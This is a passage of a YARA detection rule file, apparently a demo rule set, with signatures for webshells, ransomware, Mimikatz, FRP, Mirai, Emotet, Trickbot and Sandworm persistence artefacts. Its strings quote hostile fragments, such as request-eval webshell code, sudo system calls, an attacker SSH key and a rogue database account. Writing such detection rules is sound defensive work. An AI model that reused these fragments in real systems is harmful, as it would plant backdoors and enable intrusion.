      $xc2 = { 22 3E 43 6F 6D 6D 61 6E 64 3C 2F 6C 61 62 65 6C 3E 3C 69 6E 70 75 74 20 69 64 3D 22 ?? ?? ?? ?? ?? 22 20 74 79 70 65 3D 22 72 61 64 69 6F 22 20 6E 61 6D 65 3D 22 74 61 62 73 22 3E 3C 6C 61 62 65 6C 20 66 6F 72 3D 22 ?? ?? ?? ?? ?? 22 3E 46 69 6C 65 20 45 78 70 6C 6F 72 65 72 3C 2F 6C 61 62 65 6C 3E 3C 25 2D 2D } 
      $r1 = "(Request.Form[" ascii
      $s1 = ".Text + \" Created!\";" ascii
      $s2 = "DriveInfo.GetDrives()" ascii
      $s3 = "Encoding.UTF8.GetString(FromBase64String(str.Replace(" ascii
      $s4 = "encodeURIComponent(btoa(String.fromCharCode.apply(null, new Uint8Array(bytes))));;" 
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) or 4 of them
}

rule WEBSHELL_ASPX_Chopper_Like_Mar21_1_RID3288 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Chopper like ASPX Webshells"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2021-03-31 14:09:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ac44513e5ef93d8cbc17219350682c2246af6d5eb85c1b4302141d94c3b06c90"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "http://f/<script language=\"JScript\" runat=\"server\">var _0x" ascii
      $s2 = "));function Page_Load(){var _0x" ascii
      $s3 = ";eval(Request[_0x" ascii
      $s4 = "','orange','unsafe','" ascii
   condition: 
      filesize < 3KB and 1 of them or 2 of them
}

rule LOG_F5_BIGIP_Exploitation_Artefacts_CVE_2021_22986_Mar21_1_RID3A2F : CVE_2021_22986 DEMO LOG {
   meta:
      description = "Detects forensic artefacts indicating successful exploitation of F5 BIG IP appliances as reported by NCCGroup"
      author = "Florian Roth"
      reference = "https://research.nccgroup.com/2021/03/18/rift-detection-capabilities-for-recent-f5-big-ip-big-iq-icontrol-rest-api-vulnerabilities-cve-2021-22986/"
      date = "2021-03-20 19:35:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CVE_2021_22986, DEMO, LOG"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\",\"method\":\"POST\",\"uri\":\"http://localhost:8100/mgmt/tm/util/bash\",\"status\":200," ascii
      $x2 = "[com.f5.rest.app.RestServerServlet] X-F5-Auth-Token doesn't have value, so skipping" ascii
   condition: 
      1 of them
}

rule WEBSHELL_ASP_Embedded_Mar21_1_RID3085 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects ASP webshells"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2021-03-05 12:43:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<script runat=\"server\">" nocase
      $s2 = "new System.IO.StreamWriter(Request.Form[" 
      $s3 = ".Write(Request.Form[" 
   condition: 
      filesize < 100KB and all of them
}

rule WEBSHELL_PHP_DEWMODE_UNC2546_Feb21_1_RID3187 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects DEWMODE webshells"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html"
      date = "2021-02-22 13:26:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7"
      hash2 = "5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "<font size=4>Cleanup Shell</font></a>';" ascii fullword
      $x2 = "$(sh /tmp/.scr)" 
      $x3 = "@system('sudo /usr/local/bin/admin.pl --mount_cifs=" ascii
      $s1 = "target=\\\"_blank\\\">Download</a></td>\";" ascii
      $s2 = ",PASSWORD 1>/dev/null 2>/dev/null');" ascii
      $s3 = ",base64_decode('" ascii
      $s4 = "include \"remote.inc\";" ascii
      $s5 = "@system('sudo /usr/local" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 9KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them
}

rule APT_MAL_MalDoc_CloudAtlas_Oct20_1_RID3280 : APT DEMO FILE G0100 MAL {
   meta:
      description = "Detects unknown maldoc dropper noticed in October 2020"
      author = "Florian Roth"
      reference = "https://twitter.com/jfslowik/status/1316050637092651009"
      date = "2020-10-13 14:07:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7ba76b2311736dbcd4f2817c40dae78f223366f2404571cd16d6676c7a640d70"
      tags = "APT, DEMO, FILE, G0100, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "https://msofficeupdate.org" wide
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 300KB and 1 of ( $x* )
}

rule APT_MAL_URL_CloudAtlas_Oct20_2_RID3144 : APT DEMO FILE G0100 MAL {
   meta:
      description = "Detects unknown maldoc dropper noticed in October 2020"
      author = "Florian Roth"
      reference = "https://twitter.com/jfslowik/status/1316050637092651009"
      date = "2020-10-13 13:15:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a6a58b614a9f5ffa1d90b5d42e15521f52e2295f02c1c0e5cd9cbfe933303bee"
      tags = "APT, DEMO, FILE, G0100, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $hc1 = { 5B 49 6E 74 65 72 6E 65 74 53 68 6F 72 74 63 75 74 5D 0D 0A 55 52 4C 3D 68 74 74 70 73 3A 2F 2F 6D 73 6F 66 66 69 63 65 75 70 64 61 74 65 2E 6F 72 67 } 
   condition: 
      uint16 ( 0 ) == 0x495b and filesize < 200 and $hc1 at 0
}

rule MAL_RANSOM_REvil_Oct20_1_RID2ED2 : CRIME DEMO EXE MAL RANSOM {
   meta:
      description = "Detects REvil ransomware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2020-10-13 11:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5966c25dc1abcec9d8603b97919db57aac019e5358ee413957927d3c1790b7f4"
      hash2 = "f66027faea8c9e0ff29a31641e186cbed7073b52b43933ba36d61e8f6bce1ab5"
      hash3 = "f6857748c050655fb3c2192b52a3b0915f3f3708cd0a59bbf641d7dd722a804d"
      tags = "CRIME, DEMO, EXE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 0f 8c 74 ff ff ff 33 c0 5f 5e 5b 8b e5 5d c3 8b } 
      $op2 = { 8d 85 68 ff ff ff 50 e8 2a fe ff ff 8d 85 68 ff } 
      $op3 = { 89 4d f4 8b 4e 0c 33 4e 34 33 4e 5c 33 8e 84 } 
      $op4 = { 8d 85 68 ff ff ff 50 e8 05 06 00 00 8d 85 68 ff } 
      $op5 = { 8d 85 68 ff ff ff 56 57 ff 75 0c 50 e8 2f } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them or 4 of them
}

rule MAL_DOC_ZLoader_Oct20_1_RID2EA7 : DEMO FILE MAL Zloader {
   meta:
      description = "Detects weaponized ZLoader documents"
      author = "Florian Roth"
      reference = "https://twitter.com/JohnLaTwC/status/1314602421977452544"
      date = "2020-10-10 11:23:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "668ca7ede54664360b0a44d5e19e76beb92c19659a8dec0e7085d05528df42b5"
      hash2 = "a2ffabbb1b5a124f462a51fee41221081345ec084d768ffe1b1ef72d555eb0a0"
      hash3 = "d268af19db475893a3d19f76be30bb063ab2ca188d1b5a70e51d260105b201da"
      tags = "DEMO, FILE, MAL, Zloader"
      minimum_yara = "3.5.0"
      
   strings:
      $sc1 = { 78 4E FC 04 AB 6B 17 E2 33 E3 49 62 50 69 BB 60 31 00 1E 00 02 4B BA E2 D8 E3 92 22 1E 69 96 20 98 } 
      $sc2 = { 6B 9E E2 36 E3 69 62 72 69 3A 60 55 6E } 
      $sc3 = { 3E 69 76 60 59 6E 34 FB 87 6B 75 } 
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 40KB and filesize > 30KB and all of them
}

rule APT_MAL_NK_Lazarus_VHD_Ransomware_Oct20_2_RID359F : APT CRIME DEMO EXE FILE G0032 MAL NK RANSOM {
   meta:
      description = "Detects Lazarus VHD Ransomware"
      author = "Florian Roth"
      reference = "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      date = "2020-10-05 16:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "097ca829e051a4877bca093cee340180ff5f13a9c266ad4141b0be82aae1a39b"
      hash2 = "73a10be31832c9f1cbbd798590411009da0881592a90feb472e80025dfb0ea79"
      tags = "APT, CRIME, DEMO, EXE, FILE, G0032, MAL, NK, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { f9 36 88 08 8d ad fc ff ff ff 66 ff c1 e9 72 86 } 
      $op2 = { c6 c4 58 0f a4 c8 12 8d ad ff ff ff ff 0f b6 44 } 
      $op3 = { 88 02 66 c1 f0 54 8d bf fc ff ff ff 0f ba e0 19 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them
}

rule HKTL_Mimikatz_SkeletonKey_in_memory_Aug20_1_RID3752 : DEMO HKTL S0002 T1003 T1098_004 T1134_005 T1547_008 T1550_002 T1550_003 {
   meta:
      description = "Detects Mimikatz SkeletonKey in Memory"
      author = "Florian Roth"
      reference = "https://twitter.com/sbousseaden/status/1292143504131600384?s=12"
      date = "2020-08-09 17:33:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, S0002, T1003, T1098_004, T1134_005, T1547_008, T1550_002, T1550_003"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = { 60 ba 4f ca c7 44 24 34 dc 46 6c 7a c7 44 24 38 03 3c 17 81 c7 44 24 3c 94 c0 3d f6 } 
   condition: 
      1 of them
}

rule APT_MAL_Ke3chang_Ketrican_Jun20_1_RID3280 : APT DEMO EXE G0004 MAL ketrican {
   meta:
      description = "Detects Ketrican malware"
      author = "Florian Roth"
      reference = "BfV Cyber-Brief Nr. 01/2020"
      date = "2020-06-18 14:07:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "02ea0bc17875ab403c05b50205389065283c59e01de55e68cee4cf340ecea046"
      hash2 = "f3efa600b2fa1c3c85f904a300fec56104d2caaabbb39a50a28f60e0fdb1df39"
      tags = "APT, DEMO, EXE, G0004, MAL, ketrican"
      minimum_yara = "3.5.0"
      
   strings:
      $xc1 = { 00 59 89 85 D4 FB FF FF 8B 85 D4 FB FF FF 89 45 FC 68 E0 58 40 00 8F 45 FC E9 } 
      $op1 = { 6a 53 58 66 89 85 24 ff ff ff 6a 79 58 66 89 85 } 
      $op2 = { 8d 45 bc 50 53 53 6a 1c 8d 85 10 ff ff ff 50 ff } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) or 2 of them
}

rule APT_MAL_RU_Turla_Kazuar_May20_1_RID31E1 : APT DEMO EXE FILE G0010 MAL RUSSIA {
   meta:
      description = "Detects Turla Kazuar malware"
      author = "Florian Roth"
      reference = "https://www.epicturla.com/blog/sysinturla"
      date = "2020-05-28 13:41:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1749c96cc1a4beb9ad4d6e037e40902fac31042fa40152f1d3794f49ed1a2b5c"
      hash2 = "1fca5f41211c800830c5f5c3e355d31a05e4c702401a61f11e25387e25eeb7fa"
      hash3 = "2d8151dabf891cf743e67c6f9765ee79884d024b10d265119873b0967a09b20f"
      tags = "APT, DEMO, EXE, FILE, G0010, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Sysinternals" ascii fullword
      $s2 = "Test Copyright" wide fullword
      $op1 = { 0d 01 00 08 34 2e 38 30 2e 30 2e 30 00 00 13 01 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
}

rule APT_Sandworm_SSH_Key_May20_1_RID30ED : APT DEMO T1021_004 {
   meta:
      description = "Detects SSH key used by Sandworm on exploited machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730"
      hash2 = "538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e"
      tags = "APT, DEMO, T1021_004"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2q/NGN/brzNfJiIp2zswtL33tr74pIAjMeWtXN1p5Hqp5fTp058U1EN4NmgmjX0KzNjjV" 
   condition: 
      filesize < 1000KB and 1 of them
}

rule APT_Sandworm_SSHD_Config_Modification_May20_1_RID3793 : APT DEMO T1021_004 {
   meta:
      description = "Detects ssh config entry inserted by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 17:44:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730"
      hash2 = "538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e"
      tags = "APT, DEMO, T1021_004"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "AllowUsers mysql_db" ascii
      $a1 = "ListenAddress" ascii fullword
   condition: 
      filesize < 10KB and all of them
}

rule APT_Sandworm_InitFile_May20_1_RID318B : APT DEMO SCRIPT {
   meta:
      description = "Detects mysql init script used by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730"
      hash2 = "538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "GRANT ALL PRIVILEGES ON * . * TO 'mysqldb'@'localhost';" ascii
      $s2 = "CREATE USER 'mysqldb'@'localhost' IDENTIFIED BY '" ascii fullword
   condition: 
      filesize < 10KB and all of them
}

rule APT_Sandworm_User_May20_1_RID3016 : APT DEMO {
   meta:
      description = "Detects user added by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 12:24:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730"
      hash2 = "538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e"
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "mysql_db:x:" ascii
      $a1 = "root:x:" 
      $a2 = "daemon:x:" 
   condition: 
      filesize < 4KB and all of them
}

rule APT_WEBSHELL_PHP_Sandworm_May20_1_RID3214 : APT DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects GIF header PHP webshell used by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dc074464e50502459038ac127b50b8c68ed52817a61c2f97f0add33447c8f730"
      hash2 = "538d713cb47a6b5ec6a3416404e0fc1ebcbc219a127315529f519f936420c80e"
      tags = "APT, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $h1 = "GIF89a <?php $" ascii
      $s1 = "str_replace(" ascii
   condition: 
      filesize < 10KB and $h1 at 0 and $s1
}

rule APT_LNX_Academic_Camp_May20_Eraser_1_RID33C6 : APT DEMO FILE LINUX {
   meta:
      description = "Detects malware used in attack on academic data centers"
      author = "Florian Roth"
      reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
      date = "2020-05-16 15:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "552245645cc49087dfbc827d069fa678626b946f4b71cb35fa4a49becd971363"
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $sc2 = { E6 FF FF 48 89 45 D0 8B 45 E0 BA 00 00 00 00 BE 00 00 00 00 89 C7 E8 } 
      $sc3 = { E6 FF FF 89 45 DC 8B 45 DC 83 C0 01 48 98 BE 01 00 00 00 48 89 C7 E8 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them
}

rule APT_LNX_Academic_Camp_May20_Loader_1_RID33BB : APT DEMO FILE LINUX {
   meta:
      description = "Detects malware used in attack on academic data centers"
      author = "Florian Roth"
      reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
      date = "2020-05-16 15:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0efdd382872f0ff0866e5f68f0c66c01fcf4f9836a78ddaa5bbb349f20353897"
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $sc1 = { C6 45 F1 00 C6 45 F2 0A C6 45 F3 0A C6 45 F4 4A C6 45 F5 04 C6 45 F6 06 C6 45 F7 1B C6 45 F8 01 } 
      $sc2 = { 01 48 39 EB 75 EA 48 83 C4 08 5B 5D 41 5C 41 5D } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 10KB and all of them
}

rule MAL_RANSOM_Ragna_Locker_Apr20_1_RID3195 : CRIME DEMO EXE MAL RANSOM {
   meta:
      description = "Detects Ragna Locker Ransomware"
      author = "Florian Roth"
      reference = "https://otx.alienvault.com/indicator/file/c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6"
      date = "2020-04-27 13:28:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6"
      tags = "CRIME, DEMO, EXE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "---RAGNAR SECRET---" ascii
      $xc1 = { 0D 0A 25 73 0D 0A 0D 0A 25 73 0D 0A 25 73 0D 0A 25 73 0D 0A 0D 0A 25 73 0D 0A 00 00 2E 00 72 00 61 00 67 00 6E 00 61 00 72 00 5F } 
      $xc2 = { 00 2D 00 66 00 6F 00 72 00 63 00 65 00 00 00 00 00 57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00 44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00 5C 00 6E 00 6F 00 74 00 65 00 70 00 61 00 64 00 2E 00 65 00 78 00 65 00 } 
      $s1 = "bootfont.bin" wide fullword
      $sc2 = { 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 00 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 2E 00 6F 00 6C 00 64 00 00 00 54 00 6F 00 72 00 20 00 62 00 72 00 6F 00 77 00 73 00 65 00 72 00 } 
      $op1 = { c7 85 58 ff ff ff 55 00 6b 00 c7 85 5c ff ff ff } 
      $op2 = { 50 c7 85 7a ff ff ff 5c } 
      $op3 = { 8b 75 08 8a 84 0d 20 ff ff ff ff 45 08 32 06 8b } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 4 of them
}

rule MAL_RANSOM_COVID19_Apr20_1_RID2ECC : CRIME DEMO EXE FILE MAL RANSOM {
   meta:
      description = "Detects ransomware distributed in COVID-19 theme"
      author = "Florian Roth"
      reference = "https://unit42.paloaltonetworks.com/covid-19-themed-cyber-attacks-target-government-and-medical-organizations/"
      date = "2020-04-15 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2779863a173ff975148cb3156ee593cb5719a0ab238ea7c9e0b0ca3b5a4a9326"
      tags = "CRIME, DEMO, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/savekey.php" wide
      $op1 = { 3f ff ff ff ff ff 0b b4 } 
      $op2 = { 60 2e 2e 2e af 34 34 34 b8 34 34 34 b8 34 34 34 } 
      $op3 = { 1f 07 1a 37 85 05 05 36 83 05 05 36 83 05 05 34 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them
}

rule HKTL_FRP_Apr20_1_RID2BFF : DEMO HKTL T1090 {
   meta:
      description = "Detects FRP fast reverse proxy tool often used by threat groups"
      author = "Florian Roth"
      reference = "https://github.com/fatedier/frp"
      date = "2020-04-07 09:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-11-03"
      hash1 = "05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006"
      hash2 = "08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d"
      tags = "DEMO, HKTL, T1090"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "frp/vendor/github.com/spf13/" ascii
      $x2 = "github.com/fatedier/frp/vendor/" ascii
      $fpg2 = "<html" 
      $fpg3 = "<HTML" 
      $fpg6 = "<?xml" 
   condition: 
      1 of ( $x* ) and not 1 of ( $fp* )
}

rule HKTL_FRP_INI_Apr20_1_RID2D3E : DEMO FILE HKTL T1090 {
   meta:
      description = "Detects FRP fast reverse proxy tool INI file often used by threat groups"
      author = "Florian Roth"
      reference = "Chinese Hacktools OpenDir"
      date = "2020-04-07 10:23:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1dabef3c170e4e559c50d603d47fb7f66f6e3da75a65c3435b18175d6e9785bb"
      tags = "DEMO, FILE, HKTL, T1090"
      minimum_yara = "3.5.0"
      
   strings:
      $h1 = "[common]" ascii
      $s1 = "server_addr =" ascii fullword
      $s2 = "remote_port =" ascii fullword
      $s3 = "[RemoteDesktop]" ascii fullword
      $s4 = "local_ip = " ascii
      $s5 = "type = tcp" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x635b and filesize < 1KB and $h1 at 0 and all of them
}

rule APT_MAL_LNX_Penquin_Turla_Apr20_1_RID329A : APT DEMO FILE G0010 LINUX MAL RUSSIA {
   meta:
      description = "Detects Penquin Turla Linux malware"
      author = "Florian Roth"
      reference = "https://twitter.com/IntezerLabs/status/1247131160452509696"
      date = "2020-04-05 14:12:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"
      hash2 = "8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"
      tags = "APT, DEMO, FILE, G0010, LINUX, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/root/.hsperfdata" ascii fullword
      $s2 = "Desc|     Filename     |  size  |state|" ascii fullword
      $s3 = "IPv6 address %s not supported" ascii fullword
      $s4 = "File already exist on remote filesystem !" ascii fullword
      $s5 = "/tmp/.sync.pid" ascii fullword
      $s6 = "'gateway' supported only on ethernet/FDDI/token ring/802.11/ATM LANE/Fibre Channel" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 5000KB and 4 of them
}

rule WEBSHELL_ASPX_XslTransform_Aug21_RID3233 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects an ASPX webshell utilizing XSL Transformations"
      author = "Max Altgelt"
      reference = "https://gist.github.com/JohnHammond/cdae03ca5bc2a14a735ad0334dcb93d6"
      date = "2020-02-23 13:55:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $csharpshell = "Language=\"C#\"" nocase
      $x1 = "<root>1</root>" 
      $x2 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(" 
      $s1 = "XsltSettings.TrustedXslt" 
      $s2 = "Xml.XmlUrlResolver" 
      $s3 = "FromBase64String(Request[\"" 
   condition: 
      filesize < 500KB and $csharpshell and ( 1 of ( $x* ) or all of ( $s* ) )
}

rule MAL_Mirai_Nov19_1_RID2CC8 : DEMO FILE MAL {
   meta:
      description = "Detects Mirai malware"
      author = "Florian Roth"
      reference = "https://twitter.com/bad_packets/status/1194049104533282816"
      date = "2019-11-13 10:03:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bbb83da15d4dabd395996ed120435e276a6ddfbadafb9a7f096597c869c6c739"
      hash2 = "fadbbe439f80cc33da0222f01973f27cce9f5ab0709f1bfbf1a954ceac5a579b"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "SERVZUXO" fullword ascii
      $s2 = "-loldongs" fullword ascii
      $s3 = "/dev/null" fullword ascii
      $s4 = "/bin/busybox" fullword ascii
      $sc1 = { 47 72 6F 75 70 73 3A 09 30 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize <= 100KB and 4 of them
}

rule MAL_Emotet_JS_Dropper_Oct19_1_RID316E : DEMO FILE MAL T1059_007 {
   meta:
      description = "Detects Emotet JS dropper"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/aaa75105-dc85-48ca-9732-085b2ceeb6eb/"
      date = "2019-10-03 13:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "38295d728522426672b9497f63b72066e811f5b53a14fb4c4ffc23d4efbbca4a"
      hash2 = "9bc004a53816a5b46bfb08e819ac1cf32c3bdc556a87a58cbada416c10423573"
      tags = "DEMO, FILE, MAL, T1059_007"
      minimum_yara = "3.5.0"
      
   strings:
      $xc1 = { FF FE 76 00 61 00 72 00 20 00 61 00 3D 00 5B 00 27 00 } 
   condition: 
      uint32 ( 0 ) == 0x0076feff and filesize <= 700KB and $xc1 at 0
}

rule MAL_Trickbot_Malware_Oct19_1_RID3133 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "58852140a2dc30e799b7d50519c56e2fd3bb506691918dbf5d4244cc1f4558a2"
      hash2 = "aabf54eb27de3d72078bbe8d99a92f5bcc1e43ff86774eb5321ed25fba5d27d4"
      hash3 = "9d6e4ad7f84d025bbe9f95e74542e7d9f79e054f6dcd7b37296f01e7edd2abae"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Celestor@hotmail.com" fullword ascii
      $s2 = "\\txtPassword" ascii
      $s14 = "Invalid Password, try again!" fullword wide
      $op1 = { 78 c4 40 00 ff ff ff ff b4 47 41 } 
      $op2 = { 9b 68 b2 34 46 00 eb 14 8d 55 e4 8d 45 e8 52 50 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 3 of them
}

rule MAL_Trickbot_Malware_Oct19_2_RID3134 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
